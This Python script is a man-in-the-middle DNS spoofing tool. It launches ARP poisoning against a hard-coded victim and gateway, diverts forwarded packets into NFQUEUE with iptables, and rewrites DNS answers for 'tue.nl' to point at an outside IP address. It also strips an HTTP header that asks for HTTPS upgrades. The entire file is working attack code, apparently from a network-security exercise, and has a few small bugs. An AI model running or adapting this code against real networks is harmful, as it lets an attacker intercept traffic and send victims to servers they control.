from typing import Any
from netfilterqueue import NetfilterQueue
import os
import ArpPoison
import threading
from scapy.all import IP, UDP, DNS, DNSRR, DNSQR, Ether
from scapy.layers.http import *

class Dns_spoof:

    def __init__(self, queue_num, ipVictim, ipServer, host) -> None:
        print('in init')
        self.queue_num = queue_num
        self.ipVictim = ipVictim
        self.ipServer = ipServer
        self.host = host

    def __call__(self) -> None:
        print('in call')
        arpThread = threading.Thread(target=ArpPoison.MIMspoofARP, args=(self.ipVictim, self.ipServer), daemon=True)
        arpThread.start()

        os.system(
            f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queue_num}')
        self.queue = NetfilterQueue()
        self.queue.bind(self.queue_num, self.call_back)

        try:
            self.queue.run()
        except KeyboardInterrupt:
            os.system(
                f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queue_num}')
            print("iptables flushed")
        
    def call_back(self, bin_packet):
        packet = IP(bin_packet.get_payload())
        if packet.haslayer(DNSRR):
            try:
                queryName = packet[DNSQR].qname.decode()
                #if queryName in self.host:
                if self.host[0] in queryName:
                    print("Packet in host")
                    packet[DNS].an = DNSRR(
                        rrname=queryName, rdata=host[1])
                    packet[DNS].ancount = 1
                    del packet[IP].len
                    del packet[IP].chksum
                    del packet[UDP].len
                    del packet[UDP].chksum

            except IndexError:
                return False
            packet.summary()
            bin_packet.set_payload(bytes(packet))
        elif packet.haslayer(HTTPRequest):
            try:
                httpHost = packet[HTTPRequest].Host.decode()
                if self.host[0] in httpHost:
                    del packet[HTTPRequest].Upgrade_Insecure_Requests
                    del packet[IP].len
                    del packet[IP].chksum
                    del packet[TCP].len
                    del packet[TCP].chksum
            except IndexError as error:
                return False
            packet.summary()
            packet.show()
            bin_packet.set_payload(bytes(packet))
        return bin_packet.accept()

if __name__ == '__main__':
    print('in main')
    host = ("tue.nl", "146.190.62.39")
    queue_num = 1
    ipVictim = '192.168.178.144' # The IP address of the victim
    ipServer = '192.168.178.1' # The IP address of the gateway   
    print('starting spoof') 
    x = Dns_spoof(queue_num, ipVictim, ipServer, host)    
    x()
